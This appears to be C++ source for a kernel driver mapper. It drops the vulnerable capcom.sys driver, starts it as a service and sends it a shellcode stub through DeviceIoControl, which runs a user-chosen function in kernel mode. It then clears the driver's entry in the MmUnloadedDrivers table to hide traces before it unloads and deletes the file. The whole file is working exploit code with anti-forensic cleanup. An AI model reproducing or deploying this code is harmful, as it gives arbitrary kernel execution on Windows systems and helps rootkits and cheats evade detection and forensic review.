#include "includes.hpp"

void CapcomDispatcher(kernel::MmGetSystemRoutineAddress mm_get_system_routine_address)
{
    (*g_user_function)(mm_get_system_routine_address);
}

bool CapcomControl::ClearMmUnloadedDrivers()
{
    void* buffer = nullptr;
    ULONG buffer_size = 0;

    NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, buffer, buffer_size, &buffer_size);

    while (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (buffer)
        {
            delete[] buffer;
        }

        buffer = new BYTE[buffer_size];

        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, buffer, buffer_size, &buffer_size);
    }

    if (!NT_SUCCESS(status))
    {
        if (buffer)
        {
            delete[] buffer;
        }

        return false;
    }

    auto* handle_info = (nt::SYSTEM_HANDLE_INFORMATION_EX*)buffer;

    ULONGLONG object = 0;

    for (DWORD i = 0; i < handle_info->HandleCount; ++i)
    {
        if ((DWORD)handle_info->Handles[i].UniqueProcessId != GetCurrentProcessId())
        {
            continue;
        }

        if (handle_info->Handles[i].HandleValue == device_handle)
        {
            object = (ULONGLONG)handle_info->Handles[i].Object;

            delete[] buffer;

            break;
        }
    }

    ULONGLONG device_object = 0;

    driver_mapper::KernelCopyMemory((PVOID)(object + 0x8), &device_object, sizeof(device_object));

    ULONGLONG driver_object = 0;

    driver_mapper::KernelCopyMemory((PVOID)(device_object + 0x8), &driver_object, sizeof(driver_object));

    ULONGLONG driver_section = 0;

    driver_mapper::KernelCopyMemory((PVOID)(driver_object + 0x28), &driver_section, sizeof(driver_section));

    UNICODE_STRING base_dll_name = { 0 };
    UNICODE_STRING full_dll_name = { 0 };
    
    driver_mapper::KernelCopyMemory((PVOID)(driver_section + 0x58), &base_dll_name, sizeof(base_dll_name));
    driver_mapper::KernelCopyMemory((PVOID)(driver_section + 0x48), &full_dll_name, sizeof(full_dll_name));

    base_dll_name.Length = 0;
    base_dll_name.MaximumLength = 0;

    full_dll_name.Length = 0;
    full_dll_name.MaximumLength = 0;

    driver_mapper::KernelCopyMemory(&base_dll_name, (PVOID)(driver_section + 0x58), sizeof(base_dll_name));
    driver_mapper::KernelCopyMemory(&full_dll_name, (PVOID)(driver_section + 0x48), sizeof(full_dll_name));

    return true;
}

bool CapcomControl::ExecuteUserFunction(user_function p_func)
{
    if (!p_func || !device_handle)
    { 
        return false;
    }

    g_user_function = &p_func;

    BYTE* payload_ptr = nullptr;

    BYTE payload_template[] =
    {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // pointer to start
        0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 - will put p_func into RAX
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // p_func
        0x58,                                                       // POP RAX
        0xFF, 0x20                                                  // JMP [RAX]
    };

    payload_ptr = (BYTE*)VirtualAlloc(nullptr, sizeof(payload_template), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!payload_ptr)
    {
        LOG("[-] VirtualAlloc error %d", GetLastError());

        return false;
    }

    ZeroMemory(payload_ptr, sizeof(payload_template));
    memcpy(payload_ptr, payload_template, sizeof(payload_template));

    *(DWORD64*)payload_ptr = (DWORD64)(payload_ptr + 8);
    *(DWORD64*)(payload_ptr + 13) = (DWORD64)CapcomDispatcher;
    
    DWORD output_buf;
    DWORD bytes_returned;

    BYTE* target = payload_ptr + sizeof(void*);

    if (!DeviceIoControl(device_handle, CAPCOM_IOCTL, &target, CAPCOM_INPUT_BUF_SIZE, &output_buf, CAPCOM_OUTPUT_BUF_SIZE, &bytes_returned, nullptr))
    {
        LOG("[-] DeviceIoControl error %d", GetLastError());

        VirtualFree(payload_ptr, 0, MEM_RELEASE);

        return false;
    }

    VirtualFree(payload_ptr, 0, MEM_RELEASE);

    return true;
}

bool CapcomControl::Load()
{
    LOG("[>] Loading capcom.sys");

    wchar_t temp_path[MAX_PATH] = { 0 };

    if (!GetTempPathW(MAX_PATH, temp_path))
    {
        LOG("[-] GetTempPathW error: %d", GetLastError());

        return false;
    }

    std::filesystem::path path_to_driver(temp_path);

    path_to_driver += driver_name;

    if (!tools::CreateFileFromMemory(path_to_driver, capcom_binary, CAPCOM_SYS_LEN))
    {
        LOG("[-] Can't create capcom.sys file from memory.");

        return false;
    }

    driver_temp_path = path_to_driver;

    if (!service::RegisterAndStart(path_to_driver))
    {
        LOG("[-] Can't register and start service.");

        std::filesystem::remove(path_to_driver);

        return false;
    }

    HANDLE device_handle = CreateFile(device_name.c_str(), GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

    if (device_handle != INVALID_HANDLE_VALUE)
    {
        this->device_handle = device_handle;

        return true;
    }

    std::filesystem::remove(path_to_driver);

    return false;
}

bool CapcomControl::Unload()
{
    LOG("[>] Unloading capcom.sys");

    if (!ClearMmUnloadedDrivers())
    {
        LOG("[-] Can't clear MmUnloadedDrivers table");
    }

    std::filesystem::path _driver_name(driver_name);

    CloseHandle(device_handle);

    if (!service::UnregisterAndStop(_driver_name))
    {
        LOG("[-] Can't unregister and stop capcom.sys, error %d", GetLastError());

        return false;
    }

    try
    {
        return std::filesystem::remove(driver_temp_path);
    }
    catch (std::exception& ex)
    {
        LOG("%s", ex.what());

        return false;
    }
}